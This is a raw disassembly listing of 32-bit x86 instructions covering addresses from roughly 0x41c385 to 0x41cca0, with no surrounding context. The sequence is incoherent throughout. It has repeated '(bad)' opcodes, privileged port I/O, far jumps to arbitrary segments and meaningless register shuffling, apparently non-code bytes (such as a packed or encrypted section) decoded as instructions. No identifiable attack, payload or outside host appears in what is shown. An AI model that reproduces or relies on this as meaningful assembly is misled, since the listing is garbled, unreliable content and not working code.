  41c385:	cdq    
  41c386:	dec    ebp
  41c387:	sub    BYTE PTR [esi-0xca40542],0x80
  41c38e:	mov    esp,db1
  41c391:	push   edi
  41c392:	dec    ebp
  41c393:	aaa    
  41c394:	daa    
  41c395:	push   ds
  41c396:	push   ebp
  41c397:	jno    0x41c3b8
  41c399:	loop   0x41c36d
  41c39b:	dec    ecx
  41c39c:	(bad)  
  41c39d:	sar    dh,1
  41c39f:	sbb    al,0x1e
  41c3a1:	sub    BYTE PTR [edi],dh
  41c3a3:	les    ebx,FWORD PTR [edi-0x40]
  41c3a6:	mov    eax,0x37bd0966
  41c3ab:	enter  0xa925,0x8d
  41c3af:	imul   ecx,DWORD PTR [edx-0x18709c09],0xffffffde
  41c3b6:	hlt    
  41c3b7:	and    DWORD PTR [edx],ebx
  41c3b9:	sub    DWORD PTR [ebx],ecx
  41c3bb:	repz and BYTE PTR [edx+ecx*4+0x4664a19d],dl
  41c3c3:	adc    BYTE PTR [edi-0x7c],dh
  41c3c6:	fstp   QWORD PTR [esi]
  41c3c8:	xchg   edi,eax
  41c3c9:	push   cs
  41c3ca:	or     eax,0xc479d426
  41c3cf:	in     al,dx
  41c3d0:	(bad)  
  41c3d1:	das    
  41c3d2:	mov    edx,DWORD PTR [ebx+0x6b]
  41c3d5:	fmul   DWORD PTR [edx]
  41c3d7:	frstpm(287 only) 
  41c3d9:	shr    edx,cl
  41c3db:	add    al,0x3a
  41c3dd:	pop    edi
  41c3de:	mov    WORD PTR ds:0x17fd4bf1,cs
  41c3e4:	call   0x8c64:0x9d071a4c
  41c3eb:	inc    ebp
  41c3ec:	int    0xbc
  41c3ee:	sub    DWORD PTR [edi+0x49],ecx
  41c3f1:	push   cs
  41c3f2:	mov    DWORD PTR [eax-0x22],ecx
  41c3f5:	mov    dh,0x8b
  41c3f7:	dec    ebx
  41c3f8:	or     BYTE PTR ds:0x7b1502e5,cl
  41c3fe:	in     al,dx
  41c3ff:	xchg   ecx,eax
  41c400:	inc    ecx
  41c401:	jmp    0x41c434
  41c403:	mov    ds:0x8943f7e1,eax
  41c408:	fs mov ah,0xc4
  41c40b:	add    DWORD PTR [ebx],eax
  41c40d:	gs jmp 0xb416eab0
  41c413:	sub    eax,edi
  41c415:	aam    0xb
  41c417:	sub    ecx,DWORD PTR [esi-0x22ec74f9]
  41c41d:	pushf  
  41c41e:	push   DWORD PTR [eax-0x1f0d65e8]
  41c424:	sbb    DWORD PTR [ebp+0xea2db0d],ecx
  41c42a:	mov    bh,0xd5
  41c42c:	push   0xffffffc9
  41c42e:	add    al,0xb6
  41c430:	jnp    0x91166988
  41c436:	lahf   
  41c437:	push   ss
  41c438:	or     eax,0x6af639fc
  41c43d:	ins    DWORD PTR es:[edi],dx
  41c43e:	call   0xa7ec67bb
  41c443:	jmp    0xa4fb:0xc5b7b2ff
  41c44a:	test   BYTE PTR [esi+0x48de8f51],0xe1
  41c451:	mov    ch,BYTE PTR [edx-0x45]
  41c454:	push   es
  41c455:	pop    ss
  41c456:	sub    DWORD PTR [edx+0xb],ebx
  41c459:	push   eax
  41c45a:	jmp    0x41c41d
  41c45c:	adc    eax,0x204df621
  41c461:	mov    ebp,0x6a9a84cc
  41c466:	push   esp
  41c467:	pop    eax
  41c468:	xchg   ecx,eax
  41c469:	out    0xf3,eax
  41c46b:	push   esp
  41c46c:	add    DWORD PTR [edx],esi
  41c46e:	adc    esp,DWORD PTR [ecx-0x346a1909]
  41c474:	aad    0x43
  41c476:	pop    edi
  41c477:	inc    ecx
  41c478:	pop    esi
  41c479:	ret    0xfece
  41c47c:	das    
  41c47d:	add    cl,BYTE PTR [ebx+0x4]
  41c480:	cmp    eax,0x22e170b1
  41c485:	(bad)  
  41c486:	sub    al,0x4e
  41c488:	in     al,0xac
  41c48a:	pop    eax
  41c48b:	and    edi,edx
  41c48d:	mov    ds:0x168ed407,al
  41c492:	repz adc al,0x19
  41c495:	aaa    
  41c496:	jne    0x41c4a6
  41c498:	imul   ecx,DWORD PTR [esi+0x5535bb4b],0xb5fc8d7f
  41c4a2:	push   ss
  41c4a3:	push   ecx
  41c4a4:	mov    esp,DWORD PTR [ecx+0x981768f]
  41c4aa:	sbb    edi,DWORD PTR [esi]
  41c4ac:	in     al,dx
  41c4ad:	pop    ecx
  41c4ae:	fs pop ss
  41c4b0:	jne    0x41c516
  41c4b2:	xchg   esi,eax
  41c4b3:	ret    0x64d4
  41c4b6:	inc    esp
  41c4b7:	leave  
  41c4b8:	or     BYTE PTR [edi-0x7c22ea45],0x2
  41c4bf:	mov    ecx,0x325e1892
  41c4c4:	ins    DWORD PTR es:[edi],dx
  41c4c5:	sub    bl,BYTE PTR [ebp-0x6a]
  41c4c8:	sar    DWORD PTR [edx],0x7a
  41c4cb:	adc    eax,0xdb8c5b34
  41c4d0:	pop    ds
  41c4d1:	inc    eax
  41c4d2:	add    al,0x22
  41c4d4:	mov    WORD PTR [ecx+ebx*8+0x6f257310],cs
  41c4db:	xchg   ebx,eax
  41c4dc:	jmp    0x41c553
  41c4de:	or     DWORD PTR [ebx],eax
  41c4e0:	pushf  
  41c4e1:	aad    0x3f
  41c4e3:	mov    cl,0x3b
  41c4e5:	fild   QWORD PTR [ebx+ecx*1-0x2d141ebb]
  41c4ec:	(bad)  
  41c4ed:	out    dx,al
  41c4ee:	ror    BYTE PTR [esi],cl
  41c4f0:	(bad)  
  41c4f1:	mov    ds:0x7fb92d4a,al
  41c4f6:	out    dx,eax
  41c4f7:	fadd   QWORD PTR [eax+edi*2]
  41c4fa:	loope  0x41c500
  41c4fc:	xchg   ebx,eax
  41c4fd:	jl     0x41c480
  41c4ff:	adc    al,0x5
  41c501:	adc    DWORD PTR [ecx],edi
  41c503:	pop    es
  41c504:	fcomp  st(5)
  41c506:	and    edi,DWORD PTR [ecx-0x1a]
  41c509:	es out dx,eax
  41c50b:	add    ebp,DWORD PTR ds:0x70dc3e45
  41c511:	retf   0x9ba7
  41c514:	dec    esi
  41c515:	jg     0x41c497
  41c517:	test   dh,al
  41c519:	pop    edi
  41c51a:	mov    bh,0xe0
  41c51c:	xchg   DWORD PTR [ecx-0x66],esp
  41c51f:	push   esi
  41c520:	mov    edx,0xd5d19c2
  41c525:	(bad)  
  41c526:	lock out 0xf,al
  41c529:	push   0x72
  41c52b:	lods   eax,DWORD PTR ds:[esi]
  41c52c:	pop    esp
  41c52d:	dec    ebp
  41c52e:	jns    0x41c572
  41c530:	sub    esi,edi
  41c532:	inc    esp
  41c533:	xor    al,BYTE PTR es:[edx-0x13]
  41c537:	or     dl,bl
  41c539:	sub    ebx,eax
  41c53b:	dec    edx
  41c53c:	sub    BYTE PTR [ebx-0x49ef443d],cl
  41c542:	nop
  41c543:	bound  ecx,QWORD PTR [ecx]
  41c545:	ins    DWORD PTR es:[edi],dx
  41c546:	dec    edi
  41c547:	sub    BYTE PTR [eax],dl
  41c549:	neg    BYTE PTR [esi+edx*4]
  41c54c:	sahf   
  41c54d:	fwait
  41c54e:	push   edi
  41c54f:	pop    esi
  41c550:	adc    BYTE PTR [eax],ah
  41c552:	rcr    esp,1
  41c554:	out    0xc5,al
  41c556:	jmp    0xabf0:0x8cdd1b3c
  41c55d:	xchg   dl,dl
  41c55f:	lea    ebp,[ecx-0x6f]
  41c562:	sub    dh,al
  41c564:	or     DWORD PTR [ecx-0x49e64c10],ebx
  41c56a:	add    dl,BYTE PTR [edi-0x37]
  41c56d:	jmp    0xc0:0xcc038ff9
  41c574:	xchg   edx,eax
  41c575:	xchg   edx,eax
  41c576:	maxps  xmm0,XMMWORD PTR [ebp-0x17]
  41c57a:	retf   
  41c57b:	push   ebp
  41c57c:	or     al,0x9d
  41c57e:	sbb    DWORD PTR [eax+esi*8-0x1d30c94e],esi
  41c585:	hlt    
  41c586:	cmp    esi,DWORD PTR [edx]
  41c588:	dec    edi
  41c589:	pop    edi
  41c58a:	push   ecx
  41c58b:	neg    DWORD PTR [edx]
  41c58d:	mov    bh,0x1e
  41c58f:	sub    BYTE PTR [ebp+0x62],ch
  41c592:	cdq    
  41c593:	test   al,0xb1
  41c595:	aaa    
  41c596:	shl    ebp,cl
  41c598:	xor    al,0x41
  41c59a:	jne    0x41c583
  41c59c:	mov    es,WORD PTR [edx-0xa]
  41c59f:	hlt    
  41c5a0:	xor    al,0x72
  41c5a2:	dec    edx
  41c5a3:	outs   dx,DWORD PTR ds:[esi]
  41c5a4:	adc    edi,ebx
  41c5a6:	pop    eax
  41c5a7:	jnp    0x41c55f
  41c5a9:	xchg   edx,eax
  41c5aa:	adc    eax,0x1b0bb3c7
  41c5af:	mov    edi,0x75a62077
  41c5b4:	imul   edx,DWORD PTR [edi],0xed3d7e22
  41c5ba:	out    0xda,al
  41c5bc:	popa   
  41c5bd:	jmp    0x41c5f3
  41c5bf:	retf   
  41c5c0:	mov    dl,0x71
  41c5c2:	ja     0x41c61d
  41c5c4:	cs pop ebp
  41c5c6:	sub    bl,BYTE PTR [edi+0x127054a6]
  41c5cc:	mov    bh,0xd2
  41c5ce:	and    dl,ah
  41c5d0:	xchg   BYTE PTR [eax+0xe],bl
  41c5d3:	call   0x1c3d8379
  41c5d8:	ficomp DWORD PTR [ebx+0x34]
  41c5dc:	xchg   esi,eax
  41c5dd:	lods   al,BYTE PTR ds:[esi]
  41c5de:	fwait
  41c5df:	and    DWORD PTR [edx],eax
  41c5e1:	adc    bh,BYTE PTR [ebp-0x553083d5]
  41c5e7:	stos   BYTE PTR es:[edi],al
  41c5e8:	sub    DWORD PTR [ebx+0x176cbb85],esi
  41c5ee:	inc    edi
  41c5ef:	aaa    
  41c5f0:	jge    0x41c603
  41c5f2:	sub    eax,0x70f5c5a7
  41c5f7:	and    edx,DWORD PTR [esi]
  41c5f9:	aam    0xf5
  41c5fb:	mov    edi,0x6bba09c8
  41c600:	mov    WORD PTR [edx+0x66],cs
  41c603:	sbb    BYTE PTR [ecx+0x21a51f37],dh
  41c609:	hlt    
  41c60a:	mov    edi,DWORD PTR [esi]
  41c60c:	lods   al,BYTE PTR ds:[esi]
  41c60d:	cmp    DWORD PTR [edx+0x7bc8aca9],esp
  41c613:	jae    0x41c599
  41c615:	dec    ecx
  41c616:	data16 and dh,BYTE PTR [ebp-0x22]
  41c61a:	and    eax,0x36f07519
  41c61f:	faddp  st(4),st
  41c621:	cmp    dh,BYTE PTR [edx+0x29]
  41c624:	pushf  
  41c625:	jg     0x41c652
  41c627:	mov    dh,0x9f
  41c629:	das    
  41c62a:	mov    dh,0x11
  41c62c:	and    DWORD PTR [ebx-0x20],ecx
  41c62f:	dec    ecx
  41c630:	sbb    cl,BYTE PTR [edx-0x352336e1]
  41c636:	dec    esp
  41c637:	xor    eax,0x8a875a05
  41c63c:	pop    ds
  41c63d:	hlt    
  41c63e:	push   cs
  41c63f:	pop    ebx
  41c640:	sub    BYTE PTR [eax+0x17],ah
  41c643:	sub    al,0x9d
  41c645:	ret    
  41c646:	(bad)  
  41c648:	jb     0x41c5fe
  41c64a:	sar    BYTE PTR [ecx+eax*8-0x704aa485],cl
  41c651:	stc    
  41c652:	jo     0x41c6b2
  41c654:	into   
  41c655:	xor    BYTE PTR [ecx],cl
  41c657:	sub    al,BYTE PTR [eax+ebp*2-0x67937306]
  41c65e:	jns    0x41c669
  41c660:	fcmovnb st,st(4)
  41c662:	jl     0x41c5e8
  41c664:	xor    eax,0xf285c149
  41c669:	xor    DWORD PTR [edi+ebx*1-0x77],esp
  41c66d:	clc    
  41c66e:	test   DWORD PTR [eax+0x1efa765b],0x68f107e4
  41c678:	int3   
  41c679:	fwait
  41c67a:	push   edx
  41c67b:	pop    ecx
  41c67c:	xchg   esi,eax
  41c67d:	fstp   QWORD PTR [ecx+0x7bf800e0]
  41c683:	and    BYTE PTR [edx-0x34],0xf7
  41c687:	jmp    0x41c6e0
  41c689:	cmp    esp,esp
  41c68b:	sub    al,0xb0
  41c68d:	retf   
  41c68e:	pop    eax
  41c68f:	or     dl,BYTE PTR [edi-0x39]
  41c692:	push   edx
  41c693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c694:	xchg   edx,eax
  41c695:	sbb    al,0x56
  41c697:	push   ecx
  41c698:	and    eax,0x47b56cb4
  41c69d:	xchg   esp,eax
  41c69e:	adc    al,0xdc
  41c6a0:	cmp    al,0x4c
  41c6a2:	push   DWORD PTR [edx]
  41c6a4:	(bad)  
  41c6a5:	cmp    BYTE PTR [eax-0x5202dc32],bh
  41c6ab:	jne    0x41c6b9
  41c6ad:	cmp    BYTE PTR [ebx+ebp*8-0x15ddbb31],ah
  41c6b4:	dec    ebp
  41c6b5:	fs popa 
  41c6b7:	xlat   BYTE PTR ds:[ebx]
  41c6b8:	and    DWORD PTR [eax+0xb7d9d41],edx
  41c6be:	lea    ecx,[ebx+0x7255ed81]
  41c6c4:	lods   eax,DWORD PTR ds:[esi]
  41c6c5:	enter  0xb48e,0x5d
  41c6c9:	stc    
  41c6ca:	mov    eax,ds:0x3da73a3a
  41c6cf:	add    al,dh
  41c6d1:	pop    DWORD PTR [ecx+edx*4+0x59]
  41c6d5:	push   cs
  41c6d6:	shr    BYTE PTR gs:[esi],0x57
  41c6da:	push   eax
  41c6db:	ret    
  41c6dc:	in     al,dx
  41c6dd:	iret   
  41c6de:	mov    cs,edx
  41c6e0:	cmp    al,0xc0
  41c6e2:	jns    0x41c677
  41c6e4:	jl     0x41c733
  41c6e6:	and    dl,0xf1
  41c6e9:	popf   
  41c6ea:	jne    0x41c687
  41c6ec:	push   ss
  41c6ed:	pop    ecx
  41c6ee:	mov    WORD PTR [esi-0xc9144dd],gs
  41c6f4:	inc    ebp
  41c6f5:	jp     0x41c748
  41c6f7:	out    dx,eax
  41c6f8:	inc    ebp
  41c6f9:	jmp    0xfc71c25b
  41c6fe:	dec    ebp
  41c6ff:	lea    esi,[ebp+0x52]
  41c702:	pop    DWORD PTR [esi+0x13cc58e7]
  41c708:	ins    DWORD PTR es:[edi],dx
  41c709:	mov    ah,0xd9
  41c70b:	ret    
  41c70c:	cld    
  41c70d:	add    BYTE PTR [ecx+0x146902d1],cl
  41c713:	add    ecx,DWORD PTR [esi]
  41c715:	test   al,0x67
  41c717:	sahf   
  41c718:	scas   al,BYTE PTR es:[edi]
  41c719:	dec    edx
  41c71a:	inc    ecx
  41c71b:	mov    esi,edx
  41c71d:	cli    
  41c71e:	jmp    0x41c720
  41c720:	and    BYTE PTR [eax+0x18f6b4f8],dh
  41c726:	fcmovnbe st,st(3)
  41c728:	loope  0x41c79c
  41c72a:	add    ebp,esi
  41c72c:	lahf   
  41c72d:	pop    ss
  41c72e:	icebp  
  41c72f:	inc    esp
  41c730:	in     al,0xfe
  41c732:	cmp    eax,DWORD PTR [ecx]
  41c734:	and    cl,BYTE PTR [edi+0xfbb8dce]
  41c73a:	and    eax,0xd5
	...
  41c90b:	add    BYTE PTR ds:0x773f6240,dl
  41c911:	aas    
  41c912:	pop    ebp
  41c913:	push   0xffffff86
  41c915:	jb     0x41c979
  41c917:	stc    
  41c918:	push   edi
  41c919:	ja     0x41c978
  41c91b:	leave  
  41c91c:	mov    cl,0x8c
  41c91e:	add    DWORD PTR [eax],eax
  41c920:	and    al,BYTE PTR [edi]
  41c922:	add    BYTE PTR [eax],al
  41c924:	inc    esp
  41c925:	cmp    eax,0xa9bfbb66
  41c92a:	xor    eax,0x656b9bb3
  41c92f:	mov    dh,0x1d
  41c931:	clc    
  41c932:	cmp    DWORD PTR [ebx-0x16],ebp
  41c935:	(bad)  
  41c936:	rcr    al,1
  41c938:	jmp    0x41c938
  41c93a:	lahf   
  41c93b:	in     eax,dx
  41c93c:	sub    DWORD PTR [ebx],ebp
  41c93e:	xor    DWORD PTR [esi-0x21030802],eax
  41c944:	cld    
  41c945:	fidiv  WORD PTR [esi-0x2dbdb152]
  41c94b:	xor    al,0x4
  41c94d:	dec    esi
  41c94e:	and    eax,0xab32cd9f
  41c953:	sub    eax,0x42bf976e
  41c958:	popa   
  41c959:	loop   0x41c8f5
  41c95b:	ss mov ah,bl
  41c95e:	push   esp
  41c95f:	xor    eax,0xc1871471
  41c964:	popa   
  41c965:	dec    edi
  41c966:	mov    BYTE PTR [eax+0x59],dh
  41c969:	dec    esp
  41c96a:	pop    edi
  41c96b:	test   DWORD PTR [ecx+0x66d5f58d],esp
  41c971:	enter  0x5be9,0x72
  41c975:	add    ebp,DWORD PTR ds:0x680aa64d
  41c97b:	jae    0x41c956
  41c97d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c97e:	idiv   DWORD PTR [esi-0x31]
  41c981:	mul    BYTE PTR [esi-0x2b]
  41c984:	leave  
  41c985:	jmp    0x41c9c1
  41c987:	shl    DWORD PTR [ebx],0x97
  41c98a:	sbb    DWORD PTR [eax],ebp
  41c98c:	js     0x41c9e0
  41c98e:	mov    dh,0xe3
  41c990:	loopne 0x41c91f
  41c992:	lds    esp,FWORD PTR [eax+0x7f]
  41c995:	ja     0x41c940
  41c997:	ins    BYTE PTR es:[edi],dx
  41c998:	inc    edi
  41c999:	into   
  41c99a:	adc    al,0xc5
  41c99c:	nop
  41c99d:	pop    ds
  41c99e:	sahf   
  41c99f:	mov    ebx,0x3d84cae4
  41c9a4:	in     eax,dx
  41c9a5:	aaa    
  41c9a6:	mov    dh,0xc9
  41c9a8:	neg    BYTE PTR [esi]
  41c9aa:	jb     0x41c9c2
  41c9ac:	inc    esp
  41c9ad:	mov    bh,0x1d
  41c9af:	push   ebp
  41c9b0:	stc    
  41c9b1:	or     ecx,DWORD PTR [esi-0x35cf6748]
  41c9b7:	cmc    
  41c9b8:	or     DWORD PTR [eax],ebx
  41c9ba:	jns    0x41c9ed
  41c9bc:	and    ebp,DWORD PTR [edx+edi*4]
  41c9bf:	call   DWORD PTR [esp+ecx*4+0x64]
  41c9c3:	mul    DWORD PTR [ecx+0x7]
  41c9c6:	loope  0x41ca39
  41c9c8:	push   ebp
  41c9c9:	xor    edx,DWORD PTR [ebp+0x33]
  41c9cc:	push   edx
  41c9cd:	mov    bh,0xb4
  41c9cf:	mov    bh,0x41
  41c9d1:	aad    0x9b
  41c9d3:	fwait
  41c9d4:	popa   
  41c9d5:	mov    ds:0x4fb46bc0,eax
  41c9da:	dec    eax
  41c9db:	shl    BYTE PTR [edx],cl
  41c9dd:	xchg   BYTE PTR [esi],cl
  41c9df:	test   eax,0xda58b31f
  41c9e4:	repnz stos BYTE PTR es:[edi],al
  41c9e6:	xchg   edx,eax
  41c9e7:	add    BYTE PTR [edx+0x37e83cf4],dl
  41c9ed:	clc    
  41c9ee:	cmp    BYTE PTR [eax-0x43],cl
  41c9f1:	mov    ch,BYTE PTR [ebx]
  41c9f3:	xor    BYTE PTR [edx+eax*4],al
  41c9f6:	frstor [ebp-0x65]
  41c9f9:	mov    DWORD PTR [esi+0x24],edi
  41c9fc:	ins    DWORD PTR es:[edi],dx
  41c9fd:	(bad)  
  41c9fe:	stc    
  41c9ff:	and    BYTE PTR [esi-0x4d],bl
  41ca02:	(bad)  
  41ca03:	in     al,0xff
  41ca05:	or     BYTE PTR [ebx+0xd],ch
  41ca08:	ds inc ebp
  41ca0a:	scas   eax,DWORD PTR es:[edi]
  41ca0b:	mov    bh,0x93
  41ca0d:	addr16 push esi
  41ca0f:	mov    edx,0x3d4f2b33
  41ca14:	sbb    BYTE PTR [edi-0x6c789d6],bl
  41ca1a:	sub    DWORD PTR [esi-0x11612c41],0xfffffff9
  41ca21:	test   al,0xc7
  41ca23:	pop    edi
  41ca24:	in     al,dx
  41ca25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca26:	ins    DWORD PTR es:[edi],dx
  41ca27:	leave  
  41ca28:	clc    
  41ca29:	repz push ecx
  41ca2b:	sub    DWORD PTR [edx],edx
  41ca2d:	sti    
  41ca2e:	dec    ebx
  41ca2f:	pop    eax
  41ca30:	fnstenv [ebp-0x12]
  41ca33:	(bad)  
  41ca34:	dec    edx
  41ca35:	fstp   DWORD PTR [ebx]
  41ca37:	jmp    0x41ca48
  41ca39:	push   0x576fdc3e
  41ca3e:	(bad)  
  41ca3f:	ds retf 
  41ca41:	ror    BYTE PTR [ebp+0x7963732a],1
  41ca47:	clc    
  41ca48:	pop    eax
  41ca49:	lods   al,BYTE PTR ds:[esi]
  41ca4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca4b:	pop    ebx
  41ca4c:	xchg   ebp,eax
  41ca4d:	enter  0x3da5,0xf1
  41ca51:	fidivr WORD PTR [ebp-0x5f]
  41ca54:	(bad)  
  41ca55:	ja     0x41cabe
  41ca57:	clc    
  41ca58:	rcl    BYTE PTR [eax+0x4fc56f60],1
  41ca5e:	test   eax,0x56fda1c7
  41ca63:	xchg   BYTE PTR [edi],bl
  41ca65:	les    ebp,FWORD PTR [ebx-0x45]
  41ca68:	mov    ah,BYTE PTR [ebx+0x6f3efa08]
  41ca6e:	imul   edi,DWORD PTR [esi],0xffffff96
  41ca71:	push   edi
  41ca72:	dec    ecx
  41ca73:	mov    ebx,0x2fdd9758
  41ca78:	xchg   ebx,eax
  41ca79:	inc    esp
  41ca7a:	arpl   WORD PTR [edi+0x452ae548],si
  41ca80:	add    al,0x5c
  41ca82:	inc    esp
  41ca83:	and    ch,ah
  41ca85:	add    esi,DWORD PTR ds:0xacfd39aa
  41ca8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca8c:	xor    eax,0x5b4b5629
  41ca91:	pop    edi
  41ca92:	xlat   BYTE PTR ds:[ebx]
  41ca93:	push   0xffffff84
  41ca95:	adc    DWORD PTR [ebx],edx
  41ca97:	sub    al,0x5e
  41ca99:	xchg   esp,eax
  41ca9a:	loop   0x41ca4a
  41ca9c:	push   ebp
  41ca9d:	mov    ebp,0x5b0fda4b
  41caa2:	sub    DWORD PTR [ebx+0x979c7f],ebx
  41caa8:	outs   dx,BYTE PTR ds:[esi]
  41caa9:	in     al,dx
  41caaa:	push   ecx
  41caab:	mov    ebp,0x26d8fa65
  41cab0:	and    dh,BYTE PTR [ecx-0x49]
  41cab3:	adc    ebp,ecx
  41cab5:	inc    edi
  41cab6:	sbb    BYTE PTR [edx],ch
  41cab8:	out    0xb7,al
  41caba:	in     eax,0x90
  41cabc:	mov    ds:0x61eae556,eax
  41cac1:	pop    ecx
  41cac2:	sub    eax,0xf6712805
  41cac7:	inc    ebx
  41cac8:	(bad)  
  41cac9:	rol    DWORD PTR [edx-0x45ac9ca0],1
  41cacf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cad0:	stc    
  41cad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cad2:	inc    edx
  41cad3:	shl    DWORD PTR [ebp-0x39da8e87],1
  41cad9:	out    0xe4,eax
  41cadb:	push   eax
  41cadc:	sbb    eax,0x31f5a402
  41cae1:	shr    DWORD PTR [ebp-0xbd98dea],1
  41cae7:	stos   DWORD PTR es:[edi],eax
  41cae8:	lock ror BYTE PTR [ecx-0x4c7021af],cl
  41caef:	cmc    
  41caf0:	fild   WORD PTR [ebx+0x37]
  41caf3:	in     al,dx
  41caf4:	jg     0x41cad8
  41caf6:	gs mov ebx,0xde184594
  41cafc:	xchg   BYTE PTR [edi],ch
  41cafe:	mov    eax,ds:0x796c95df
  41cb03:	retf   
  41cb04:	lahf   
  41cb05:	mov    WORD PTR [ebx],?
  41cb07:	mov    edi,0x5b9c5891
  41cb0c:	mov    ebx,0x7b496489
  41cb11:	xchg   ebx,eax
  41cb12:	rcl    BYTE PTR [ecx-0x14],1
  41cb15:	cmc    
  41cb16:	push   0x24
  41cb18:	call   0x49a540f1
  41cb1d:	mov    ebp,0x1eccdec7
  41cb22:	dec    ecx
  41cb23:	and    al,0x1b
  41cb25:	lea    edi,[ecx-0x32]
  41cb28:	aam    0x33
  41cb2a:	push   eax
  41cb2b:	(bad)  
  41cb2c:	(bad)  
  41cb2e:	xchg   DWORD PTR [ebx+0x31d11acc],ecx
  41cb34:	mov    eax,0xa2007487
  41cb39:	loop   0x41cace
  41cb3b:	aam    0xd1
  41cb3d:	inc    edx
  41cb3e:	imul   edi,eax,0x4e
  41cb41:	and    bl,dh
  41cb43:	fimul  DWORD PTR [esi]
  41cb45:	fsubr  QWORD PTR [ebp+0xf65457a]
  41cb4b:	or     dh,cl
  41cb4d:	cdq    
  41cb4e:	loopne 0x41cb2a
  41cb50:	mov    esi,0x34166260
  41cb55:	ins    DWORD PTR es:[edi],dx
  41cb56:	pop    ebp
  41cb57:	call   0x565d0b4a
  41cb5c:	lock push ebx
  41cb5e:	sbb    al,0xcb
  41cb60:	push   ebx
  41cb61:	test   dl,bh
  41cb63:	xchg   BYTE PTR [ecx+0x4e93213e],bl
  41cb69:	pop    edx
  41cb6a:	mov    esp,0xfb54ac56
  41cb6f:	mov    ds:0xb061676f,al
  41cb74:	and    al,0x7e
  41cb76:	xchg   edx,eax
  41cb77:	shr    ebp,0xe3
  41cb7a:	push   0x82684af6
  41cb7f:	in     eax,0xfd
  41cb81:	mov    es,edi
  41cb83:	lods   al,BYTE PTR ds:[esi]
  41cb84:	pop    ds
  41cb85:	or     ecx,0x97e63b9f
  41cb8b:	iret   
  41cb8c:	leave  
  41cb8d:	rol    ch,0xcd
  41cb90:	pop    edx
  41cb91:	dec    ebx
  41cb92:	test   DWORD PTR [eax-0x39],edi
  41cb95:	push   es
  41cb96:	ins    DWORD PTR es:[edi],dx
  41cb97:	inc    ecx
  41cb98:	lods   eax,DWORD PTR ds:[esi]
  41cb99:	imul   esi,edx,0xffffffad
  41cb9c:	push   0xffffff93
  41cb9e:	mov    edx,0xcb746fa6
  41cba3:	repz sbb dh,BYTE PTR [esp+ebp*1+0x6bd1c60f]
  41cbab:	pop    ecx
  41cbac:	mov    ds:0xab176359,eax
  41cbb1:	test   edx,esi
  41cbb3:	xchg   esp,eax
  41cbb4:	mov    ds:0xe1325f45,al
  41cbb9:	cwde   
  41cbba:	pop    edi
  41cbbb:	out    dx,eax
  41cbbc:	jno    0x41cbd6
  41cbbe:	mov    edx,0x44a69233
  41cbc3:	inc    ecx
  41cbc4:	fdiv   DWORD PTR [edi-0x71]
  41cbc7:	lahf   
  41cbc8:	xor    al,0x78
  41cbca:	push   ss
  41cbcb:	(bad)  
  41cbcc:	data16 cmp ah,BYTE PTR [eax]
  41cbcf:	gs mov ah,0xbd
  41cbd2:	iret   
  41cbd3:	lock leave 
  41cbd5:	pop    ds
  41cbd6:	sbb    eax,0xd90ae2c0
  41cbdb:	xchg   ebx,eax
  41cbdc:	pop    eax
  41cbdd:	xor    eax,0xb93cbf02
  41cbe2:	scas   eax,DWORD PTR es:[edi]
  41cbe3:	minps  xmm6,xmm1
  41cbe6:	rol    DWORD PTR [eax-0x52384664],0x65
  41cbed:	les    ecx,FWORD PTR [ebp+0x3c115155]
  41cbf3:	push   ecx
  41cbf4:	loopne 0x41cbd7
  41cbf6:	mov    dh,0x6e
  41cbf8:	sbb    dh,BYTE PTR [esp+0x68d073c3]
  41cbff:	dec    esp
  41cc00:	mov    cl,0x25
  41cc02:	pop    ss
  41cc03:	test   BYTE PTR [edx-0x4ab60348],ch
  41cc09:	push   ebp
  41cc0a:	xchg   esi,eax
  41cc0b:	clc    
  41cc0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc0d:	leave  
  41cc0e:	pop    ecx
  41cc0f:	xchg   edi,eax
  41cc10:	sub    eax,0x6db5871
  41cc15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc16:	(bad)  
  41cc18:	call   DWORD PTR [edi+0xa]
  41cc1b:	dec    ebx
  41cc1c:	aas    
  41cc1d:	or     ah,dl
  41cc1f:	xchg   esi,eax
  41cc20:	pop    ds
  41cc21:	out    0xf2,al
  41cc23:	push   ss
  41cc24:	jae    0x41cc06
  41cc26:	push   cs
  41cc27:	pop    eax
  41cc28:	push   esi
  41cc29:	cld    
  41cc2a:	retf   
  41cc2b:	jmp    0x37e:0xef5bdc5e
  41cc32:	mov    al,ds:0x598864e3
  41cc37:	test   al,0x17
  41cc39:	or     ebp,DWORD PTR [eax]
  41cc3b:	cmp    ebx,esp
  41cc3d:	pop    es
  41cc3e:	bndldx bnd1,ds:[ecx+0x56]
  41cc43:	sbb    al,0xab
  41cc45:	dec    edi
  41cc46:	fwait
  41cc47:	in     al,0x46
  41cc49:	sub    dh,BYTE PTR [ebx+0x22f071ee]
  41cc4f:	inc    edx
  41cc50:	stos   BYTE PTR es:[edi],al
  41cc51:	pop    eax
  41cc52:	adc    eax,0x446a7d30
  41cc57:	jle    0x41cc06
  41cc59:	inc    edi
  41cc5a:	lods   al,BYTE PTR ds:[esi]
  41cc5b:	aad    0x6e
  41cc5d:	adc    DWORD PTR es:0x52d033ea,ebx
  41cc64:	ror    BYTE PTR [ecx],cl
  41cc66:	jl     0x41ccc4
  41cc68:	enter  0x39a5,0xc3
  41cc6c:	inc    ebp
  41cc6d:	outs   dx,BYTE PTR ds:[esi]
  41cc6e:	mov    dh,0x1d
  41cc70:	repnz add al,0xe2
  41cc73:	inc    edx
  41cc74:	xor    BYTE PTR [ebx+0x10b33e4f],dl
  41cc7a:	add    BYTE PTR [ecx+0x779cb89],bh
  41cc80:	push   0xbea849e2
  41cc85:	in     al,0x3f
  41cc87:	stos   BYTE PTR es:[edi],al
  41cc88:	jmp    0xdbbc:0xf72e96a4
  41cc8f:	dec    edx
  41cc90:	sbb    DWORD PTR [eax+edi*1-0x63],0xe49089e7
  41cc98:	mov    esi,0x5e127108
  41cc9d:	les    esi,FWORD PTR [ecx]
  41cc9f:	stos   DWORD PTR es:[edi],eax
  41cca0:	mov    ch,0x6
